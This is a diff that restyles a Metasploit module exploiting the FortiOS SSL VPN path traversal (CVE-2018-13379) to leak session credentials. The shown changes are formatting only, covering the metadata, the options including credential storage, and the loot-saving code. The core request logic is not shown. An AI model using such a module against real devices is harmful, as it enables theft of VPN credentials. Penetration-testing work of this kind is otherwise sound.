@@ -1,3 +1,5 @@
+# frozen_string_literal: true
+
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -11,8 +13,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'FortiOS Path Traversal Leak Credentials',
-      'Description' => %q{
+                      'Name' => 'FortiOS Path Traversal Leak Credentials',
+                      'Description' => '
         FortiOS system file leak through SSL VPN via specially crafted HTTP
         resource requests. A path traversal vulnerability in the FortiOS SSL
         VPN web portal may allow an unauthenticated attacker to download FortiOS
@@ -22,29 +24,28 @@ class MetasploitModule < Msf::Auxiliary
         the `/dev/cmdb/sslvpn_websession` file. This vulnerability affects
         (FortiOS 5.4.6 to 5.4.12, FortiOS 5.6.3 to 5.6.7 and FortiOS 6.0.0
         to 6.0.4).
-      },
-      'References' => [
-        ['CVE', '2018-13379'],
-        ['URL', 'https://www.fortiguard.com/psirt/FG-IR-18-384'],
-        ['EDB', '47287'],
-        ['EDB', '47288']
-      ],
-      'Author' => [
-        'lynx (Carlos Vieira)',         # initial module author from edb
-        'mekhalleh (RAMELLA Sébastien)' # this module author (Zeop Entreprise)
-      ],
-      'License' => MSF_LICENSE,
-      'DefaultOptions' => {
-        'RPORT' => 10443,
-        'SSL' => true
-      }
-    ))
+      ',
+                      'References' => [
+                        %w[CVE 2018-13379],
+                        ['URL', 'https://www.fortiguard.com/psirt/FG-IR-18-384'],
+                        %w[EDB 47287],
+                        %w[EDB 47288]
+                      ],
+                      'Author' => [
+                        'lynx (Carlos Vieira)',         # initial module author from edb
+                        'mekhalleh (RAMELLA Sébastien)' # this module author (Zeop Entreprise)
+                      ],
+                      'License' => MSF_LICENSE,
+                      'DefaultOptions' => {
+                        'RPORT' => 10_443,
+                        'SSL' => true
+                      }))
 
     register_options([
-      OptEnum.new('DUMP_FORMAT', [true, 'Dump format.', 'raw', ['raw', 'ascii']]),
-      OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true]),
-      OptString.new('TARGETURI', [true, 'Base path', '/remote'])
-    ])
+                       OptEnum.new('DUMP_FORMAT', [true, 'Dump format.', 'raw', %w[raw ascii]]),
+                       OptBool.new('STORE_CRED', [false, 'Store credential into the database.', true]),
+                       OptString.new('TARGETURI', [true, 'Base path', '/remote'])
+                     ])
   end
 
   def execute_request
@@ -153,10 +154,10 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     loot_data = case datastore['DUMP_FORMAT']
-    when /ascii/
-      data.gsub(/[^[:print:]]/, '.')
-    else
-      data
+                when /ascii/
+                  data.gsub(/[^[:print:]]/, '.')
+                else
+                  data
     end
     loot_path = store_loot('', 'text/plain', @ip_address, loot_data, '', '')
     print_good(message("File saved to #{loot_path}"))
